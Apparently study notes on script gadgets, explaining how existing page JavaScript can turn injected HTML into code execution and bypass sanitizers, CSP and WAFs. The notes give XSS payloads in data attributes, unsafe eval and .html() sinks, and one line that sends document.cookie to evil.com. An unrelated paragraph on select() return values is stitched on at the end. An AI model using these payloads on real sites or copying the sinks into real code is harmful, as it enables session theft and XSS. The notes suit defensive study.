        -------------------------
        A Script Gadget is a piece of legitimate
JavaScript code that can be triggered via an
HTML injection and that upgrades otherwise
benign HTML code to code execution


HTML sanitizers remove known-bad and unknown HTML elements and
attributes.
<script>, onerror etc.


Gadgets can bypass HTML sanitizers because:
● JS code can be present in benign attributes (id, title)
● Gadgets leverage data-* attributes a lot



<script>
    var scriptContent = document.getElementById("myDiv").innerHTML;
    eval(scriptContent); // Execute the JavaScript code
  </script>



Content Security Policy identifies trusted and injected scripts.
CSP stops the execution of injected scripts only

<div data-toggle=tooltip data-html=true
 title='&lt;script&gt;alert(1)&lt;/script&gt;'>



Depending on the CSP mode, trusted scripts:
● Are loaded from a whitelist of origins,
● Are annotated with a secret nonce value


<img src="http://evil.com/?cookie={{@global.document.cookie}}">


Content Security Policy
Distinguish legitimate and injected JS code
• Whitelist legitimate origins
• Whitelist code hash
• Require a secret nonce

WAFs, XSS filters
Block requests containing dangerous tags / attributes



Script Gadget is an *existing* JS code on the page that may be used to
bypass mitigations:


<div data-role="button"
data-text="&lt;script&gt;alert(1)&lt;/script&gt;"></div>
<script>
 var buttons = $("[data-role=button]");
 buttons.html(button.getAttribute("data-text"));
</script>

  If select() returns a positive integer, it means that one or more file descriptors are ready for the specified I/O operation. The value indicates the number of file descriptors that are ready.
If select() returns 0, it means that the specified timeout has elapsed, and no file descriptors are ready within that time period.
If select() returns -1, it indicates an error occurred during the execution of select(). In this case, you can check the value of the errno variable to determine the specific error condition.
